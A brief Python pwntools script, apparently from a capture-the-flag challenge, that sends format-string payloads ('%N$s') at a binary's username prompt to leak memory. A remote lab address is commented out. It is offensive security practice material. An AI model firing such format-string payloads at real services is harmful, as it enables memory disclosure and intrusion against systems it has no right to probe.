from pwn import *

binary = './pwn21'

context.log_level = 'debug'
context.binary = binary
context.endian = 'big'

for i in range(32):
    e = ELF(binary)
    r = process(binary)
    # r = remote('10.10.191.2', 1337)

    r.sendlineafter(b'Username: ', flat([
        f"%{i}$s",
    ]))

    r.interactive()
